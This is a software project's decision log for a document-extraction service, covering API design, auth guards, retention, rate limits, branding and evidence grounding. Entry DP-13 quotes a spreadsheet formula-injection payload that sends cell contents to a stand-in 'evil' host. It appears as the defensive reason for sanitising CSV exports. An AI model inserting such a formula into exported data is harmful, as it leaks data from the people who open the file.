# DECISIONS.md — Document Processing

Product-level decisions. Workspace-wide decisions (D-01 … D-18) live in the parent
`DECISIONS.md`; these are the ones taken while building this MVP. Newest at the bottom.

| # | Date | Decision | Why | Consequences |
|---|---|---|---|---|
| DP-01 | 2026-09-12 | **The document id *is* the ARAG resource id.** `DocumentRecord.id === resourceId`, and both are surfaced in the API. | One opaque id for callers, no mapping table, and `DELETE /documents/{id}` can delete the KB resource without a lookup. | If a document is ever re-ingested it gets a new id; the old record must be deleted first. Documented in `docs/developer/api-reference.md`. |
| DP-02 | 2026-09-12 | **The pipeline is a platform job (`kind: process-document`); SSE is a *view* of that job.** `GET /api/v1/jobs/{id}/events` replays the events so far and then streams. | The prototype ran the whole workflow inside a `GET /api/process` SSE handler: a GET with side effects, and a client disconnect left ARAG calls running with nowhere to put the result. | A closed browser tab no longer loses an extraction; jobs are listable, cancellable and inspectable in the admin panel long after they finish. |
| DP-03 | 2026-09-12 | **Every agent call uses `POST /ask` with `resource_filters: [rid]`, never `POST /resource/{rid}/ask`.** | Verified live: the per-resource endpoint answers HTTP 500/503 whenever `rag_strategies: [{name:"full_resource"}]` is present, while `/ask` + `resource_filters` accepts the identical payload. full_resource grounding is non-negotiable for extraction. | Recorded as the fifth ARAG mechanic in `docs/architecture/arag-integration.md` and as a comment in `services/agents.ts`. If ARAG fixes the per-resource endpoint this can be revisited; there is no functional reason to. |
| DP-04 | 2026-09-12 | **Custom extraction configs are persisted server-side (`DATA_DIR/extraction-configs.json`), not in browser localStorage.** | The prototype re-registered every config from `localStorage` on each page load, re-provisioning ARAG search configurations every time and losing configs for anyone but their author. | Configs survive restarts and are shared across users and clients; the demo UI just reads `GET /api/v1/extraction-configs`. Built-ins stay computed from `SCHEMAS` and are not deletable (409). |
| DP-05 | 2026-09-12 | **Built-in extraction configs are identified by their document type** (`invoice`, `medical_claim`, …); custom ones get `cfg_<8 hex>`. | `?config=invoice` reads well in a URL and keeps the built-in catalogue stable across deploys. | Custom config names may not collide with a document type; `POST /extraction-configs` derives the ARAG configuration name as `dip_custom_<slug>`. |
| DP-06 | 2026-09-12 | **Product-specific env is prefixed `DIP_`** (`DIP_EXTRACT_STRATEGY`, `DIP_MAX_UPLOAD_BYTES`), with the deployed build's unprefixed names (`ARAG_EXTRACT_STRATEGY`, `MAX_UPLOAD_BYTES`) still honoured. | STANDARDS §6 requires the product prefix; the running Fly app already has the old secrets set. | The Fly app keeps working through a deploy without a secret migration; `.env.example` documents both. |
| DP-07 | 2026-09-12 | **Upload MIME allowlist + filename sanitisation, enforced before anything reaches the KB.** pdf, png, jpeg, webp, tiff, txt, md, csv, docx. Unknown declared types fall back to the extension. | The prototype pushed arbitrary bytes into the Knowledge Box and echoed the raw `X-Filename` into `Content-Disposition`. | Anything else is a 415 with the allowlist in the problem detail; `sanitiseFilename` strips directories, control characters and quotes. |
| DP-08 | 2026-09-12 | **Retention is explicit: `POST /api/v1/admin/purge {olderThanDays}` deletes from the store *and* the Knowledge Box**, and `DELETE /documents/{id}` always deletes the KB resource. | The audit found uploads stayed in the KB forever; the hard rules require this product to delete every test resource it creates. | No background TTL sweeper in the MVP (a deliberate omission — an operator or a cron calling the endpoint is auditable); noted in `docs/architecture/limits.md`. |
| DP-09 | 2026-09-12 | **Pipeline stages are `soft`: a failing stage records a stage error and the run continues.** Only a missing document record fails the whole job. | A flaky entity or summary call should not lose a successful extraction; the demo must degrade visibly rather than break. | `status: "ready"` can coexist with stage errors; the UI shows the failed step in the timeline and the record carries whatever was produced. |
| DP-10 | 2026-09-12 | **Multipart bodies are parsed in the route with the original `Content-Type` header.** | The platform's `body: "auto"` path lowercases the Content-Type before parsing, which destroys mixed-case boundaries (`----WebKitFormBoundaryAbC…`) and yields zero parts for every browser upload. Platform bug, reported to the Head. | `POST /api/v1/documents` declares `body: "raw"` and calls `parseMultipart` itself. Revert once the platform is fixed; a mixed-case-boundary test guards the behaviour. |
| DP-11 | 2026-09-12 | **Product display name stays "Document Processing" in code and UI.** Three candidate names and a recommendation live in `docs/product-marketing/positioning.md`. | Workspace decision D-15: do not block on naming. | Renaming later is a find-and-replace on display strings; no code path encodes a product name. |
| DP-12 | 2026-09-12 | **Writes to shared state always require a credential, even when `API_KEYS` is unset** — the three `DELETE`s and `POST /api/v1/extraction-configs` (which provisions a stored ARAG search configuration). `requireWriter` (`src/routes/guards.ts`) accepts the admin token, an API key, or a same-origin session cookie from `POST /api/v1/session`; reads and document uploads stay anonymous-friendly. | The QA review showed that with the shipped default (`API_KEYS` empty, which `fly.toml` never sets) any anonymous caller could `DELETE` a document — removing both the record and the Knowledge Box resource — or cancel anyone's job. The platform's `auth: "api"` has only "open" and "key required". | The demo already calls `POST /api/v1/session` on load, so it is unaffected; `curl` examples that delete must obtain a session cookie or send a key. Documented on the four operations in `openapi.ts`, in `.env.example`, in `fly.toml` and in the README. The config-create gap was caught by the QA reviewer's re-verification pass. Platform gap (`auth: "api-write"`) reported to the Head. |
| DP-13 | 2026-09-12 | **CSV export neutralises spreadsheet formula injection.** A cell starting with `=`, `+`, `-`, `@`, tab or CR is prefixed with `'` unless it is a plain number. | Field values are produced by an LLM reading an attacker-supplied document, so a vendor name of `=HYPERLINK("http://evil/?"&A1)` would execute when an operator opens the export in Excel or Sheets. | Negative numbers are still exported as numbers (the `PLAIN_NUMBER` carve-out), so arithmetic on the CSV keeps working; free-text values that genuinely begin with `-` or `+` gain a leading apostrophe. |
| DP-14 | 2026-09-12 | **A failed pipeline stage is recorded on the record, not only in job events**: `meta.stageErrors[]` plus an `error`-severity entry in `issues[]`. | Stages are `soft` so one flaky agent never loses an extraction — but that made "ARAG was down and extracted nothing" look identical to "this document genuinely had no fields" to an API caller. | `status` stays `ready` (the record is still usable); callers check `meta.stageErrors` or `issues` instead of parsing `job.events`. |
| DP-15 | 2026-09-12 | **`bun audit` runs as a real gate via `scripts/audit.ts`, with dated, documented acceptances** instead of `|| true`. | STANDARDS §5 requires the audit in CI, but `@playwright/test` is pinned to 1.52.0 by organisation policy and carries a dev-only advisory whose fix (1.55.1) the corporate registry blocks — so an unconditional gate would be permanently red and an unconditional `|| true` is decorative. | Any new advisory fails CI. The single acceptance (CVE-2025-59288, dev-only shell scripts, never run in CI or in the image) expires on 2026-12-01, after which the build fails until it is re-reviewed. |
| DP-16 | 2026-09-12 | **`DOC_TYPE_VALUES` in `src/types.ts` is the single source of truth for document types**; `DocType` is derived from it, `SCHEMAS` is `Record<DocType, …>`, `openapi.ts` builds its enums from it, and the tests count it instead of hard-coding `11`. | The enablement author found that adding a document type meant editing two unsynced enum lists (types.ts and openapi.ts) with nothing but a later contract-test failure to catch a mismatch, plus three hard-coded `11`s across the suites. | Adding a type is one edit plus its schema; the compiler refuses until the schema exists, and the spec cannot drift from the code. |
| DP-17 | 2026-09-12 | **`GET /api/v1/admin/search-configurations` exposes the stored ARAG configurations read-only**, split into this product's `dip_*` entries and everything else in the KB; the admin panel shows them under the Extraction configs tab. | Operators could see *that* a config was provisioned but not *what* it provisioned — the model, RAG strategy, grounding prompt and `answer_json_schema` were only visible in the ARAG dashboard or a throwaway script. | Admin-gated; the only new read of KB state. It makes "is extraction actually pinned to the multimodal model?" answerable from the product. |
| DP-18 | 2026-09-12 | **`stats().degraded` counts records that finished but lost a stage**, surfaced in `/api/v1/admin/{health,usage}`, on the admin overview, and as a "ready · degraded" chip in the demo's document list. | `meta.stageErrors` closed the per-record blind spot, but an operator scanning a list of documents that all say `ready` still could not see that an hour of extractions had silently failed. | One counter, no new status value: `status` stays `ready` because the record is still usable. |
| DP-19 | 2026-09-12 | **The searchability probe is seeded with the document's own extracted text.** The pipeline fetches `extractedText` as soon as the resource is `PROCESSED` — before `waitSearchable` — and passes it as the probe query (platform v0.1.3's `waitSearchable({ query })`). | Measured against the live KB: a generic probe query needed ~20 polls (≈ 38 s) to see the resource, a seeded probe hit on the first attempt. The `process` stage went from 37.8 s to 6.7 s, taking the whole live pipeline from ≈ 50 s to ≈ 14 s. | The extracted text is fetched once and reused as the query seed for every later stage, so this costs nothing extra. It is the same mechanic as query seeding (ARAG mechanic 3), applied to the readiness gate. |
| DP-20 | 2026-09-12 | **Not implemented here: the "real-time Listen / evolving brief" product direction.** A late instruction asked for `POST /api/v1/listen/sessions`, transcript-chunk append, an SSE evolving-brief stream, a `ListenService` with throttling/dedupe, `POST /api/v1/scribe-token`, and a Listen-first demo tab. | Those endpoints and surfaces belong to **VoiceBridge** (`arag-voice`, PLAN §4c) — it owns `/api/v1/brief`, `/api/v1/scribe-token`, the ElevenLabs Scribe integration and the Listen/Call tabs. Document Processing has none of them: a search of this repo finds no `brief`, `scribe`, `ElevenLabs` or Listen surface to promote. Building a conversation-listening feature into a document-extraction product would not serve the owner's intent. | Flagged to the Head for re-routing to the VoiceBridge lead rather than actioned. Nothing in §4a (Document Processing) changed. |
| DP-21 | 2026-09-12 | **Cancelling a job that has already finished answers 409, not 204.** | The docs writer noticed `DELETE /api/v1/jobs/{id}` ignored `JobManager.cancel()`'s boolean and reported success for a no-op, so a caller could not tell "I stopped it" from "it had already finished". | `204` now means the job really was cancelled; `409` names the terminal state. The admin panel's Cancel button reports the conflict instead of claiming success. |
| DP-22 | 2026-09-12 | **Kept the platform's rate limiter; gave the SSE events route its own bucket** (`rateLimit: { rps: 2, burst: 30 }`, platform v0.1.4) rather than writing a product-level limiter. | The QA review wanted SSE opens limited without letting a demo that watches several pipelines at once trip the shared public bucket. A per-route bucket does both; a second limiter implementation would not. | The stream itself is never throttled — only the open costs a token. |
| DP-23 | 2026-09-12 | **The local `[hidden]{display:none!important}` workaround was removed in favour of the platform's** (UI kit v0.1.4), but the e2e assertions that caught the bug stay. | The kit now ships the rule, so duplicating it in the product would hide a future kit regression rather than surface it. | `public/app.css` keeps only a comment explaining where the rule went and why the assertions exist. |
| DP-24 | 2026-09-12 | **Playwright's server runs with `ENV_FILE=/dev/null`.** | Without it, a local `make e2e`/`make showcase` inherited the developer's real `.env` — the recording differed between machines and put a live extract-strategy id on screen in the admin shot. | e2e and the showcase are hermetic: mock ARAG, fixed admin token, no credentials, identical output on any machine and in CI. |
| DP-25 | 2026-09-12 | **Every extraction schema carries an `evidence` array of `{field, quote}`, and every quote is verified against the document's own extracted text** (`exact` / `normalised` / `unverified`), pinned to its retrieval paragraph, and rolled up as `meta.groundingScore`. | ARAG rejects `citations` alongside `answer_json_schema` (HTTP 500 live), so structured extraction had no grounding signal at all — a value and a hallucination looked identical. Asking for quotes inside the schema and checking them server-side restores the guarantee without the unavailable feature. | Every `dip_*` stored search configuration must be re-provisioned for the new schema to take effect (`POST /api/v1/admin/provision`, idempotent). An unverified quote raises a validation warning rather than being silently shown. The normaliser folds case, whitespace and typography but never digits — a quote that only matches after mangling the numbers is not evidence. |
| DP-26 | 2026-09-12 | **The mock ARAG is taught the evidence contract through an `answerHook`** (`src/services/mock-evidence.ts`), never by editing vendored files. It reuses the platform's exported `synthesizeJson` and then quotes the fixture line that actually contains each synthesised value. | The mock would otherwise fill `evidence` with unrelated lines, so the verifier would mark a perfectly extracted document ungrounded and the demo, e2e and showcase would all show a grounding score of zero. | The quotes are real substrings of the fixture text, so they verify as `exact` exactly as a well-behaved model's would — the tests exercise real verification, not a stub. |
| DP-27 | 2026-09-12 | **`usage.aragErrors` counts only real failures** (network, timeout, 5xx); expected 409s from idempotent provisioning are `aragConflicts` and other 4xx are `aragClientErrors`. | The owner's live walkthrough showed "ARAG errors: 11" after one successful run — eleven built-in configs each answering 409 on the documented POST-then-PATCH path. An operator reading that sees an outage that is not happening. | The admin tile shows real errors, with the conflict count as its sub-line. |
| DP-28 | 2026-09-12 | **The admin sign-in is a real `<form>` with a submit handler.** | A lone password input does not reliably submit on Enter (Chromium even warns "Password field is not contained in a form"), which the owner hit on the live demo. | Enter and the button take the same path; password managers behave; an e2e test presses Enter. |
| DP-29 | 2026-09-12 | **White-label by configuration: `BRAND_*` env → `GET /api/v1/branding` → both UIs.** Adopted the platform's `readBranding`/`Branding`/`BrandingSchema` and the UI kit's shell hooks (v0.1.6) rather than a local implementation. Brand assets are served read-only from `DATA_DIR/branding/` at `/branding/`. | Workspace D-25/D-26: the audience is Progress and its ISV partners, who must be able to rebrand a deployment without a fork. | A partner sets environment variables and drops a logo on the data volume; nothing is rebuilt. The endpoint is public and secret-free — it carries only what a visitor already sees. Documented in `docs/developer/white-label.md`, with `build-your-own.md` for partners going further. |
| DP-30 | 2026-09-12 | **Branding changes presentation only — never the API contract.** `info.title` stays "Document Processing API"; routes, field names and `dip_*` configuration names are untouched. | Generated SDKs and integrations key off the spec title and paths; renaming them on a rebrand would break every client. | Asserted by a test. A partner who genuinely needs the API renamed is forking, which `build-your-own.md` covers. |
| DP-31 | 2026-09-12 | **`.env.example` puts every comment on its own line.** | The platform's `.env` parser takes everything after `=` as the value, so `LOG_LEVEL=info  # a note` parses as `"info  # a note"` and the server refuses to boot. Copying `.env.example` to `.env` — exactly what `make dev` does on a fresh clone — produced that crash. | The file is now safe to copy verbatim, whether or not the parser is changed upstream; a test asserts no parsed value contains a `#`. Reported to the Head as a platform bug. |
| DP-32 | 2026-09-12 | **The product is a hash-routed workspace, not a single page.** `public/index.html` is an empty shell; `public/app.js` routes `/#/documents`, `/#/documents/:id/source`, `/#/configs/new`, `/#/settings/*` and the rest into a sidebar layout. Admin uses the same shell with its own navigation. | The owner rejected the June prototype's "one page that does the whole thing". D-28 requires an information architecture: lists with search and filters, detail views with the full record, a settings area. Hash routing rather than path routing because the platform's static server has no SPA fallback — `/documents/abc` would answer a 404 problem document rather than the app — and because the admin app is served from a sub-path where hash routes need no base configuration. | Filter and paging state lives in the hash query string, so a filtered queue is a link a colleague can be sent, and the showcase recording can deep-link a step. Path routing would need a catch-all rewrite in a security-sensitive dispatcher for no user-visible gain; reported as a platform gap. |
| DP-33 | 2026-09-12 | **`<arag-shell>` is not used; `.dip-app` replaces it**, and still calls the kit's `applyBranding()`. | The kit's shell renders a centred container with a horizontal nav — exactly the single-page shape this pass replaces. Editing the vendored kit is forbidden (hard rule 3). | `public/lib/core.js` reproduces the band, the branding hooks and the status pill around a sidebar. Twenty-two `.dip-*` components live in `public/ui-ext.css`; fifteen are general-purpose (sidebar shell, page header, breadcrumb, filter bar, data table, bulk bar, pagination, drawer, confirm dialog, empty state, stat strip, menu, skeleton, tour, sign-in) and are reported to the Head as platform-kit candidates. |
| DP-34 | 2026-09-12 | **The default look is Progress-branded**: the official "Progress Agentic RAG" wordmarks are served from `public/brand/` — `arag-logo-alt.svg` (white/green) on the ink-950 band, `arag-logo.svg` (grey/green) in the sidebar and on the admin sign-in card. Progress green `#5ce500` appears in exactly two places: inside the wordmark artwork, and as the band's 2 px bottom rule. | The owner asked for the real wordmark rather than the kit's placeholder dot. `#5ce500` measures 1.6:1 on white — far below any text threshold — and reads as "success" wherever it is used on a row, so it cannot be a UI colour. | It is forbidden as text, icon, status, chart, button, focus ring or chip colour; status green stays `--arag-accent-500`, which the kit's contrast is built around. `BRAND_*` still overrides everything: `logoUrl` replaces the wordmark, `poweredBy: false` removes the band entirely. An e2e test asserts the rule's computed colour and both wordmark paths. |
| DP-35 | 2026-09-12 | **Status, verification, grounding and validation colours are never white-labelled.** `applyBranding` touches `--arag-brand-*` and `--arag-accent-400/500` only; `ui-ext.css` takes its status colours from `--arag-warn-*`, `--arag-danger-*` and `--arag-info-*`. | A partner who sets their brand colour to red must not turn every "Ready" chip into a warning. A partner may recolour their product; they may not recolour the evidence. | Asserted by an e2e test that applies a partner payload and checks `--arag-danger-fg` is unchanged. Stated on the Settings → Branding and Admin → Branding screens so a partner reads it before they deploy. |
| DP-36 | 2026-09-12 | **The document's own extracted text is exposed as `GET /api/v1/documents/{id}/text`**, fetched from the Knowledge Box on demand and cached for five minutes rather than persisted on the record. | `Evidence.start`/`end` are offsets into that text, and the browser had no way to obtain it — so "show me where this value came from", the product's central claim, could not be built at all. Persisting it would multiply the JSON store by a page of text per document for something only one tab reads. | The Source & evidence tab marks every locatable quote inside the real text. A contract test asserts the invariant that makes it work: `text.slice(evidence.start, evidence.end) === evidence.quote` for an exactly-verified quote. If a resource is reprocessed with different extraction the offsets move with it, which is the honest behaviour. |
| DP-37 | 2026-09-12 | **`POST /api/v1/documents/{id}/reprocess` re-runs the pipeline over the existing ARAG resource**, keeping `id`, `resourceId`, `filename` and `createdAt` and clearing the derived fields. Guarded by `requireWriter`. | Every failed and degraded state needs an action that recovers it. The bytes are already in the Knowledge Box, so asking the user to find and upload the file again is busywork — and re-uploading would create a second resource and a second id. | `?config=` also makes it the way to test a config change against a document already uploaded. A document that is `pending` or `processing` answers 409 rather than queueing a second job over itself. |
| DP-38 | 2026-09-12 | **Purge is previewed before it is confirmed**: `POST /api/v1/admin/purge` takes `dryRun`, returning the exact count and the oldest/newest dates without deleting anything, and the confirmation then requires the word `DELETE` to be typed. | It is the most destructive action in the product, and a confirmation dialog that cannot state its own blast radius is theatre. | Two API round trips instead of one for the only bulk irreversible operation. The same two-step shape is not used for single deletes, which name the file and state the Knowledge Box consequence in one dialog. |
| DP-39 | 2026-09-12 | **Documents-list search (`?q=`) matches the extracted values, not just the filename** — filename, document type, summary, tags and every field label and value. | A scanner's `scan-0041.pdf` tells an AP clerk nothing; the supplier and the invoice number printed on the page are how they actually look for a document. The list rows show the same two facts as a subline for the same reason. | Search is an in-memory substring scan over the JSON store, which is fine at MVP scale and is the first thing to replace when the store becomes Postgres. Recorded in `docs/architecture/limits.md` terms: it is linear in the number of documents. |
| DP-40 | 2026-09-12 | **Settings is credential-free (`GET /api/v1/settings`), and the extract-strategy *id* stays behind `ADMIN_TOKEN`.** | "What is this connected to, and what will it accept from me?" are questions a user of the product has to be able to answer for themselves — the upload drawer's accepted types and size limit come from the API rather than from hard-coded markup. Which visual-LLM strategy a deployment runs is an operator's business. | Settings publishes a boolean (`visualExtraction`) and a label; `/api/v1/admin/config` keeps the id. A contract test asserts the settings payload contains no token and no strategy id. |
| DP-41 | 2026-09-12 | **`POST /api/v1/documents/{id}/ask` keeps anonymous access but gets its own, tighter rate-limit bucket** (`rps: 1, burst: 10`) rather than `requireWriter`. | Every ask is a real generative call against the Knowledge Box, so it costs money in a way a read does not — but the guided sample, the quickstart and the recorded walkthrough all ask a question without a credential, and putting it behind a credential would make the product's most persuasive moment unreachable to someone evaluating it. The QA reviewer was right that it needed *something*. | A per-route bucket (platform v0.1.4), the same mechanism the SSE route uses, so the shared public limit is unaffected. An anonymous caller can try the product; they cannot use it as an unbounded model proxy. Stated in the endpoint's description in `openapi.ts`. |
| DP-42 | 2026-09-12 | **`doc_type` is a repeatable query parameter** (`?doc_type=invoice&doc_type=receipt`), declared in the spec as an array. | The route already accepted repeated values while the spec documented a single string — the contract did not describe what the code did, and the QA review caught it. Repeating is the shape the platform's query validator already supports (`props[k]?.type === "array"`), so a single value still validates. | One code path instead of two, covered by a contract test for both the single and the repeated form, plus a 400 for an unknown type. The Documents filter is still a single select; making it multi-select is now a UI change alone. |
